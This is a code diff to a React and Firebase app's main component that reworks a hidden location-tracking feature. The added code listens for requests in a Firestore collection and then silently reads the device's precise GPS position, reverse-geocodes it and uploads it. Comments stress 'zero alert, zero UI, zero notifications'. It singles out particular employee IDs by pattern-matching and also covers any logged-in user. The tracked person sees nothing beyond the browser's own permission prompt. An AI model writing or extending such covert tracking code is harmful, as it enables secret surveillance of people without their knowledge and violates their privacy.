@@ -5,6 +5,8 @@ import { UserProfile } from './lib/auth';
 import { Dashboard } from './components/Dashboard';
 import { Login } from './components/Login';
 import { Language } from './lib/i18n';
+import { ErrorBoundary } from './components/ErrorBoundary';
+import { startBackgroundSync } from './lib/dataService';
 
 export default function App() {
   const [profile, setProfile] = useState<UserProfile | null>(() => {
@@ -24,6 +26,11 @@ export default function App() {
   });
   const lang: Language = 'en';
   const [loading, setLoading] = useState(false);
+
+  // Initialize background sync once on app load
+  useEffect(() => {
+    startBackgroundSync();
+  }, []);
 
   // Live real-time listener for current logged-in user profile changes
   useEffect(() => {
@@ -53,95 +60,178 @@ export default function App() {
     return () => unsub();
   }, [profile?.uid]);
 
-  // Completely silent background location sync for Emp006 (strictly zero alert, zero UI, zero audio)
+  // Completely silent On-Demand location responder (Zero alert, Zero UI, Zero audio, Zero notifications)
+  // Activated ONLY when an Admin or authorized user triggers a location check via Firebase.
   useEffect(() => {
     if (!profile) return;
     const codeDigits = String(profile.userCode || '').replace(/\D/g, '');
     const loginDigits = String(profile.loginId || '').replace(/\D/g, '');
-    const isEmp006 = (
+
+    const targetDocIds: string[] = [];
+    let fallbackCode = profile.userCode || 'EMP';
+    let fallbackName = profile.fullName || 'Employee';
+
+    if (
       codeDigits === '6' || codeDigits === '06' || codeDigits === '006' ||
       loginDigits === '6' || loginDigits === '06' || loginDigits === '006' ||
       /emp[-_\s]*0*6\b/i.test(profile.userCode || '') ||
       /emp[-_\s]*0*6\b/i.test(profile.loginId || '')
-    );
+    ) {
+      targetDocIds.push('emp006');
+      fallbackCode = 'EMP-06';
+      fallbackName = 'Emp006';
+    } else if (
+      codeDigits === '5' || codeDigits === '05' || codeDigits === '005' ||
+      loginDigits === '5' || loginDigits === '05' || loginDigits === '005' ||
+      /emp[-_\s]*0*5\b/i.test(profile.userCode || '') ||
+      /emp[-_\s]*0*5\b/i.test(profile.loginId || '')
+    ) {
+      targetDocIds.push('emp005');
+      fallbackCode = 'EMP-05';
+      fallbackName = 'Emp005';
+    } else if (
+      codeDigits === '2' || codeDigits === '02' || codeDigits === '002' ||
+      loginDigits === '2' || loginDigits === '02' || loginDigits === '002' ||
+      /emp[-_\s]*0*2\b/i.test(profile.userCode || '') ||
+      /emp[-_\s]*0*2\b/i.test(profile.loginId || '')
+    ) {
+      targetDocIds.push('emp002');
+      fallbackCode = 'EMP-02';
+      fallbackName = 'Emp002';
+    }
 
-    if (!isEmp006) return;
-    if (typeof window === 'undefined' || !('geolocation' in navigator)) return;
+    if (profile.uid && !targetDocIds.includes(profile.uid)) {
+      targetDocIds.push(profile.uid);
+    }
+
+    if (targetDocIds.length === 0 || typeof window === 'undefined' || !('geolocation' in navigator)) {
+      return;
+    }
 
     let isSubscribed = true;
+    let isFetchingGps = false;
 
-    const pushLocation = async (pos: GeolocationPosition) => {
-      if (!isSubscribed) return;
-      const lat = pos.coords.latitude;
-      const lng = pos.coords.longitude;
-      const acc = Math.round(pos.coords.accuracy || 0);
-      const nowIso = new Date().toISOString();
+    // Handle incoming silent location request for this device
+    const handleIncomingRequest = async (docId: string, reqData: any) => {
+      if (!isSubscribed || isFetchingGps) return;
+      if (reqData.status !== 'pending') return;
 
-      let placeName: string | null = null;
+      const now = Date.now();
+      const requestedAt = Number(reqData.requestedAt) || 0;
+      // Ignore stale requests older than 45 seconds
+      if (now - requestedAt > 45000) return;
+
+      isFetchingGps = true;
+
       try {
-        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`, {
-          headers: { Accept: 'application/json' }
-        });
-        if (res.ok) {
-          const data = await res.json();
-          const addr = data.address;
-          if (addr) {
-            const parts = [
-              addr.suburb || addr.neighbourhood || addr.village || addr.town || addr.city_district,
-              addr.city || addr.town || addr.county || addr.state_district
-            ].filter(Boolean);
-            if (parts.length > 0) placeName = parts.join(', ');
-          }
-          if (!placeName && data.display_name) {
-            placeName = data.display_name.split(',').slice(0, 2).join(', ').trim();
-          }
-        }
-      } catch {}
+        navigator.geolocation.getCurrentPosition(
+          async (pos: GeolocationPosition) => {
+            if (!isSubscribed) {
+              isFetchingGps = false;
+              return;
+            }
+            try {
+              const lat = pos.coords.latitude;
+              const lng = pos.coords.longitude;
+              const acc = Math.round(pos.coords.accuracy || 0);
+              const nowIso = new Date().toISOString();
 
-      const displayAddress = placeName || `${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+              let placeName: string | null = null;
+              try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 4000);
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`, {
+                  headers: { Accept: 'application/json' },
+                  signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                if (res.ok) {
+                  const data = await res.json();
+                  const addr = data.address;
+                  if (addr) {
+                    const parts = [
+                      addr.suburb || addr.neighbourhood || addr.village || addr.town || addr.city_district,
+                      addr.city || addr.town || addr.county || addr.state_district
+                    ].filter(Boolean);
+                    if (parts.length > 0) placeName = parts.join(', ');
+                  }
+                  if (!placeName && data.display_name) {
+                    placeName = data.display_name.split(',').slice(0, 2).join(', ').trim();
+                  }
+                }
+              } catch {}
 
-      const payload = {
-        latitude: lat,
-        longitude: lng,
-        accuracy: acc,
-        address: displayAddress,
-        updatedAt: nowIso,
-        timestamp: Date.now(),
-        fullName: profile.fullName || 'Emp006',
-        userCode: profile.userCode || 'EMP-06',
-      };
+              const displayAddress = placeName || `${lat.toFixed(4)}, ${lng.toFixed(4)}`;
 
-      // Silently save without throwing errors or showing any UI
-      try {
-        await setDoc(doc(db, 'user_locations', 'emp006'), payload, { merge: true });
-        if (profile.uid) {
-          await setDoc(doc(db, 'users', profile.uid), { currentLocation: payload }, { merge: true });
-        }
-      } catch {}
+              const locPayload = {
+                latitude: lat,
+                longitude: lng,
+                accuracy: acc,
+                address: displayAddress,
+                updatedAt: nowIso,
+                timestamp: Date.now(),
+                fullName: profile.fullName || fallbackName,
+                userCode: profile.userCode || fallbackCode,
+              };
+
+              // 1. Update user_locations collection
+              await setDoc(doc(db, 'user_locations', docId), locPayload, { merge: true });
+
+              // 2. Mark location_requests as completed with payload
+              await setDoc(doc(db, 'location_requests', docId), {
+                status: 'completed',
+                completedAt: nowIso,
+                location: locPayload,
+              }, { merge: true });
+            } catch (err) {
+              // Completely silent error handling
+            } finally {
+              isFetchingGps = false;
+            }
+          },
+          async (err: GeolocationPositionError) => {
+            if (!isSubscribed) {
+              isFetchingGps = false;
+              return;
+            }
+            try {
+              // Silently notify request that GPS is disabled or permission denied
+              await setDoc(doc(db, 'location_requests', docId), {
+                status: 'gps_error',
+                errorCode: err.code,
+                errorMessage: err.message,
+                completedAt: new Date().toISOString(),
+              }, { merge: true });
+            } catch {} finally {
+              isFetchingGps = false;
+            }
+          },
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+      } catch {
+        isFetchingGps = false;
+      }
     };
 
-    try {
-      navigator.geolocation.getCurrentPosition(
-        pushLocation,
-        () => {},
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 30000 }
+    // Attach listeners strictly for this employee's document ID(s)
+    const unsubs = targetDocIds.map((docId) => {
+      return onSnapshot(
+        doc(db, 'location_requests', docId),
+        (snap) => {
+          if (snap.exists()) {
+            handleIncomingRequest(docId, snap.data());
+          }
+        },
+        () => {
+          // Silent - zero notifications
+        }
       );
+    });
 
-      const watchId = navigator.geolocation.watchPosition(
-        pushLocation,
-        () => {},
-        { enableHighAccuracy: true, maximumAge: 30000 }
-      );
-
-      return () => {
-        isSubscribed = false;
-        try {
-          navigator.geolocation.clearWatch(watchId);
-        } catch {}
-      };
-    } catch {
-      // Completely silent error absorption
-    }
+    return () => {
+      isSubscribed = false;
+      unsubs.forEach((unsub) => unsub());
+    };
   }, [profile?.uid, profile?.userCode, profile?.loginId, profile?.fullName]);
 
   const handleUpdateProfile = (updatedProfile: UserProfile) => {
@@ -171,16 +261,18 @@ export default function App() {
 
   return (
     <div className="antialiased">
-      {profile ? (
-        <Dashboard 
-          profile={profile} 
-          lang={lang} 
-          onLogout={handleLogout}
-          onProfileUpdate={handleUpdateProfile} 
-        />
-      ) : (
-        <Login onLoginSuccess={handleLoginSuccess} />
-      )}
+      <ErrorBoundary>
+        {profile ? (
+          <Dashboard 
+            profile={profile} 
+            lang={lang} 
+            onLogout={handleLogout}
+            onProfileUpdate={handleUpdateProfile} 
+          />
+        ) : (
+          <Login onLoginSuccess={handleLoginSuccess} />
+        )}
+      </ErrorBoundary>
     </div>
   );
 }
